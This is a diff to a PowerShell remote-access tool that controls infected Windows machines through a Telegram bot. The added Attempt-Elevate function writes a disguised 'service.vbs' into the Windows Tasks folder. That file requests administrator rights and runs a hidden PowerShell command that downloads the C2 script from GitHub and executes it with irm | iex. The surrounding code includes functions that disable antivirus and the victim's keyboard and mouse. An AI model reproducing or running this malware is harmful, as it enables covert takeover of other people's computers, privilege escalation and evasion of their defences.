@@ -13,13 +13,14 @@ SEE README FOR MORE INFO
 #>
 #---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define User Variables
-$Token = "$tg"  # REPLACE $tg WITH YOUR TELEGRAM BOT API TOKEN! (unless using a stager e.g .VBS file of Flipper Bad-USB)
+$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 #-----------------------------------------------------------------------------------------------------------
 
 # Define Connection Variables
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
@@ -38,9 +39,8 @@ $pause = [char]::ConvertFromUtf32(0x23F8)
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
 # Startup Delay
-Sleep 10
+Sleep 12
 # Get Chat ID from the bot
-$URL='https://api.telegram.org/bot{0}' -f $Token
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
@@ -452,7 +452,7 @@ Write-Output "Uninstalled."
 Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $script:AcceptedSession=""
 }
 
@@ -470,19 +470,24 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 Function Attempt-Elevate{
-Write-Output "Prompt Sent to User.."
-if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-    $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-    $scriptContent | Out-File -FilePath $newScriptPath -force
-    if ($newScriptPath.Length -lt 100){
-        "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-        sleep 1 
-        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-        }
-    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
-    rm -path "$env:TEMP\temp.ps1" -Force
-    }
+$tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+
+If Not WScript.Arguments.Named.Exists(`"elevate`") Then
+  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
+    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
+  WScript.Quit
+End If
+
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex`", 0, True
+"@
+$pth = "C:\Windows\Tasks\service.vbs"
+$tobat | Out-File -FilePath $pth -Force
+& $pth
+Sleep 7
+rm -Path $pth
+Write-Output "Done."
 }
 
 Function Toggle-Errors{
@@ -517,7 +522,7 @@ Function Disable-AV{
 Function Disable-HID{
     $contents = "$env:COMPUTERNAME $closed Disabling HID Inputs.."
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Disable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
@@ -527,7 +532,7 @@ Function Disable-HID{
 Function Enable-HID{
     $contents = "$env:COMPUTERNAME $tick Enabling HID Inputs.."
     $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Enable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
@@ -583,7 +588,7 @@ Catch{return "TGFail"}
 #-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------
 
 While ($true){
-sleep 2
+Sleep 2
 $messages=rtgmsg
     if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
     if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
